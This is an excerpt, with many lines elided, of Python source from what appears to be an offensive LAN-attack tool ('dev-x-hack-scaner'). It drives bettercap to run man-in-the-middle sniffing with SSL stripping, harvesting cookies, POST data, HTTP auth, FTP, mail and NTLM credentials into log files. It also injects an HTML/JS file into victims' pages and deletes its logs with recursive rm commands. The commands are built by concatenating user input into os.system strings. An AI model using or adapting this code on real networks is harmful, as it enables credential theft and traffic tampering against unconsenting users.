							...
							if action_snif == "back":
								...
								def snif_sslstrip():
									...
									if action_snif_sslstrip == "y":
										print("\033[1;34m\n[++] All logs are saved on : /opt/dev-x-hack-scaner/xerosniff \033[1;m")
										...
										make_file = os.system("mkdir -p /opt/dev-x-hack-scaner/xerosniff && cd /opt/dev-x-hack-scaner/xerosniff && touch " + filename + ".log")
										cmd_show_log = os.system("""xterm -geometry 100x24 -T 'dev-x-hack-scaner' -hold -e "tail -f /opt/dev-x-hack-scaner/xerosniff/""" + filename + """.log  | GREP_COLOR='01;36' grep --color=always -E '""" + target_ips +  """|DNS|COOKIE|POST|HEADERS|BODY|HTTPS|HTTP|MQL|SNPP|DHCP|WHATSAPP|RLOGIN|IRC|SNIFFER|PGSQL|NNTP|DICT|HTTPAUTH|TEAMVIEWER|MAIL|SNMP|MPD|NTLMSS|FTP|REDIS|GET|$'" > /dev/null 2>&1 &""")
										cmd_snif = os.system("xettercap --proxy " + target_parse + target_ips + " -P MYSQL,SNPP,DHCP,WHATSAPP,RLOGIN,IRC,HTTPS,POST,PGSQL,NNTP,DICT,HTTPAUTH,TEAMVIEWER,MAIL,SNMP,MPD,COOKIE,NTLMSS,FTP,REDIS -I " + up_interface + " --gateway " + gateway + " -O, --log /opt/dev-x-hack-scaner/xerosniff/" + filename + ".log --sniffer-output /opt/dev-x-hack-scaner/xerosniff/" + filename + ".pcap")
										def snifflog():
											...
											if action_log == "n":
												cmd_log = os.system("rm /opt/dev-x-hack-scaner/xerosniff/" + filename + ".*")
						...
						def deface():
							...
							if action_deface == "back":
								...
								if file_deface == "back":
									...
									cmd_inject = os.system("xettercap " + target_parse + target_ips + " --proxy-module=/opt/dev-x-hack-scaner/tools/bettercap/lib/bettercap/proxy/http/modules/injecthtml.rb --js-file /home/home/xero-html.html -I " + up_interface + " --gateway " + gateway )
									deface()
							else:
								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
								deface()
			...
			while True:
				...
				if cmd_0 == "scan": # Map the network
					...
					def rm_log():
						...
						if cmd_rmlog == "y":
							rmlog = os.system("rm -f -R /opt/dev-x-hack-scaner/xerosniff/ /opt/dev-x-hack-scaner/tools/log/* /opt/dev-x-hack-scaner/tools/bettercap/modules/tmp/* /opt/dev-x-hack-scaner/tools/files/dns.conf")
